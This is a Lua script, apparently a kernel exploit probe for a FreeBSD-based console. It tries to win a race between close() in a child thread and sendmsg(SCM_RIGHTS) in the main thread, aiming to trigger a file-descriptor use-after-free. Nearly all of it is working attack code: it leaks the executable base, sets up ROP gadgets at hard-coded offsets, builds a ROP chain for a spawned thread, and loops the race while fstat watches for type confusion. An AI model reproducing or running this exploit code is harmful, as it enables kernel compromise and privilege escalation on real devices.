-- CRASH_CLASS: MODERATE
-- PROBE 533a: fd-close race between main and child threads
--
-- Vector: close(fd) in child thread simultaneously with
-- sendmsg(SCM_RIGHTS, fd) in main thread.
-- If the fd is closed between the kernel's fp lookup and the
-- ref increment in SCM_RIGHTS, we get a dangling reference.
--
-- This is a classic BSD UAF pattern (CVE-2019-5607 variant).
-- 89a tested the core pattern → "CVE PATCHED". But a RACE
-- between close and sendmsg might bypass the serial check.
--
-- Setup:
-- 1. Create socketpair (main thread)
-- 2. Open a target fd (e.g., another socketpair or pipe)
-- 3. Start child thread that spins calling close(target_fd)
-- 4. Main thread spins calling sendmsg(SCM_RIGHTS, target_fd)
-- 5. After N iterations, check if received fd is valid but
--    refers to freed kernel object
--
-- Detection: fstat on received fd returns different type/size
-- than expected, or triggers unusual behavior.

print("=== PROBE 533a: FD CLOSE RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_socketpair = make_syscall(135)  -- socketpair
local sc_pipe = make_syscall(42)   -- pipe2
local sc_close = make_syscall(6)
local sc_sendmsg = make_syscall(28)
local sc_recvmsg = make_syscall(27)
local sc_fstat = make_syscall(189)  -- fstat
local fn_addr = syscall.pipe.fn_addr

local ok_p, pid_v = pcall(function() return make_syscall(20)() end)
local pid = to_num(pid_v)
print("pid=" .. pid)

-- Get eboot base
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

local pop_rax_ret = eb + uint64(0x992)
local pop_rdi_ret = eb + uint64(0xC9DFE)
local pop_rsi_ret = eb + uint64(0xD77D)
local pop_rdx_ret = eb + uint64(0x3B02D7)
local pop_rcx_ret = eb + uint64(0xE64)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local bare_ret = eb + uint64(0x42)

print("eb=" .. q(eb))

-- [1] Create control socketpair for SCM_RIGHTS
local sv = memory.alloc(16); zero(sv, 16)
local ok_sp, rv_sp = pcall(function()
    return sc_socketpair(uint64(1), uint64(2), uint64(0), uint64(sv))
end)  -- AF_UNIX, SOCK_DGRAM
local send_fd = rd(sv)
local recv_fd = rd(sv + 4)
print(string.format("socketpair: send=%d recv=%d rv=%d", send_fd or -1, recv_fd or -1, to_num(rv_sp)))

-- [2] Create target fds (pipes) that we'll race on
local pipe_fds = memory.alloc(16); zero(pipe_fds, 16)
pcall(function() sc_pipe(uint64(pipe_fds), uint64(0)) end)
local target_rd = rd(pipe_fds)
local target_wr = rd(pipe_fds + 4)
print(string.format("pipe: rd=%d wr=%d", target_rd or -1, target_wr or -1))

-- [3] fstat the target fd to know its type
local stat_buf = memory.alloc(0x100); zero(stat_buf, 0x100)
pcall(function() sc_fstat(uint64(target_wr), uint64(stat_buf)) end)
local orig_mode = rd(stat_buf + 4) or 0  -- st_mode
local orig_ino = rd(stat_buf + 8) or 0   -- st_ino
print(string.format("target fstat: mode=0x%X ino=%d", orig_mode < 0 and orig_mode + 0x100000000 or orig_mode, orig_ino))

-- [4] Shared memory for coordination
local shared = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
zero(shared, 64)
-- shared+0: child loop counter
-- shared+4: child status (0=running, 1=done)
-- shared+8: anomaly counter

-- [5] Child thread: spin close(target_wr) in a loop
-- After each close, immediately re-open a pipe to reclaim the fd number
local stack = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local tcb = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
for toff = 0, 0x100, 8 do wq(tcb + toff, tcb) end
local tcb_ptr = memory.alloc(8); wq(tcb_ptr, tcb)

-- Child chain: sysarch → loop { close(target_wr); close(target_wr) } N times → store count → exit
-- Problem: ROP can't loop. So we do N sequential close calls.
-- Let's do 200 close(target_wr) calls back to back.

local CLOSE_COUNT = 200
local chain = stack + uint64(0x200000 - 0x2000)
local i = 0
local function emit(v) wq(chain + uint64(i), v); i = i + 8 end

-- sysarch(129, &tcb)
emit(uint64(165))
emit(pop_rdi_ret); emit(uint64(129))
emit(pop_rsi_ret); emit(tcb_ptr)
emit(fn_addr)

-- 200x close(target_wr)
for c = 1, CLOSE_COUNT do
    emit(pop_rax_ret); emit(uint64(6))  -- sys_close
    emit(pop_rdi_ret); emit(uint64(target_wr))
    emit(fn_addr)
end

-- Store loop count as done marker
emit(pop_rdi_ret); emit(shared + 4)
emit(pop_rax_ret); emit(uint64(1))  -- done=1
emit(mov_rdi_rax_ret)

-- thr_exit(0)
emit(pop_rax_ret); emit(uint64(431))
emit(pop_rdi_ret); emit(uint64(0))
emit(fn_addr)

local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + 0x108, uint64(0x480)); wd(ctx + 0x0D0, 0); wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0C0, uint64(0x43)); wq(ctx + 0x100, uint64(0x3B)); wq(ctx + 0x0F0, uint64(0x202))
wq(ctx + 0x0E0, pop_rax_ret); wq(ctx + 0x0F8, chain)

-- [6] Start child thread
local tid_buf = memory.alloc(8); wq(tid_buf, uint64(0))
pcall(function() sc_430(uint64(ctx), uint64(tid_buf), uint64(0)) end)

-- [7] Main thread: simultaneously send target_wr via SCM_RIGHTS
-- Build sendmsg structure for SCM_RIGHTS
local RACE_COUNT = 200
local anomalies = 0

for race = 1, RACE_COUNT do
    -- Build msghdr + cmsg for sendmsg
    local iov_buf = memory.alloc(8)  -- 1 byte of data
    wd(iov_buf, 0x42)
    
    local iov = memory.alloc(16)  -- iovec: base, len
    wq(iov, uint64(iov_buf))
    wq(iov + 8, uint64(1))
    
    -- cmsg: SCM_RIGHTS with target_wr fd
    local cmsg = memory.alloc(32)
    zero(cmsg, 32)
    wd(cmsg + 0, 20)    -- cmsg_len = CMSG_LEN(sizeof(int)) = 16+4=20
    wd(cmsg + 4, 0xFFFF) -- cmsg_level = SOL_SOCKET (0xFFFF)
    wd(cmsg + 8, 1)     -- cmsg_type = SCM_RIGHTS
    wd(cmsg + 16, target_wr)  -- the fd (after CMSG_DATA alignment at +16)
    
    local msghdr = memory.alloc(64)
    zero(msghdr, 64)
    wq(msghdr + 0, uint64(0))    -- msg_name = NULL
    wd(msghdr + 8, 0)            -- msg_namelen = 0
    wq(msghdr + 16, uint64(iov)) -- msg_iov
    wd(msghdr + 24, 1)           -- msg_iovlen = 1  
    -- Note: on 64-bit, padding after iovlen
    wq(msghdr + 32, uint64(cmsg)) -- msg_control
    wd(msghdr + 40, 24)           -- msg_controllen = CMSG_SPACE(4) = 24

    local ok_s, rv_s = pcall(function()
        return sc_sendmsg(uint64(send_fd), uint64(msghdr), uint64(0))
    end)
    
    -- Receive on the other side
    local recv_cmsg = memory.alloc(32); zero(recv_cmsg, 32)
    local recv_data = memory.alloc(8); wd(recv_data, 0)
    local recv_iov = memory.alloc(16)
    wq(recv_iov, uint64(recv_data)); wq(recv_iov + 8, uint64(1))
    
    local recv_hdr = memory.alloc(64); zero(recv_hdr, 64)
    wq(recv_hdr + 16, uint64(recv_iov))
    wd(recv_hdr + 24, 1)
    wq(recv_hdr + 32, uint64(recv_cmsg))
    wd(recv_hdr + 40, 24)
    
    local ok_r, rv_r = pcall(function()
        return sc_recvmsg(uint64(recv_fd), uint64(recv_hdr), uint64(0))
    end)
    
    -- Check received fd
    local received_fd = rd(recv_cmsg + 16) or -1
    
    if received_fd >= 0 and to_num(rv_s) >= 0 then
        -- fstat the received fd
        zero(stat_buf, 0x100)
        pcall(function() sc_fstat(uint64(received_fd), uint64(stat_buf)) end)
        local new_mode = rd(stat_buf + 4) or 0
        local new_ino = rd(stat_buf + 8) or 0
        
        if new_mode ~= orig_mode or new_ino ~= orig_ino then
            anomalies = anomalies + 1
            print(string.format("  *** ANOMALY #%d at race %d: fd=%d mode=0x%X ino=%d (was 0x%X/%d) ***",
                anomalies, race, received_fd, 
                new_mode < 0 and new_mode + 0x100000000 or new_mode, new_ino,
                orig_mode < 0 and orig_mode + 0x100000000 or orig_mode, orig_ino))
        end
        
        -- Close received fd to avoid leak
        pcall(function() sc_close(uint64(received_fd)) end)
    end
end

-- Wait for child
local ts = memory.alloc(16); wq(ts, 0); wq(ts + 8, uint64(500000000))
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

local child_done = rd(shared + 4) or 0
print("")
print(string.format("child_done=%d anomalies=%d", child_done, anomalies))

if anomalies > 0 then
    print("*** FD TYPE CONFUSION DETECTED ***")
else
    print("No anomalies in " .. RACE_COUNT .. " iterations")
end

print("")
print("=== 533a DONE ===")
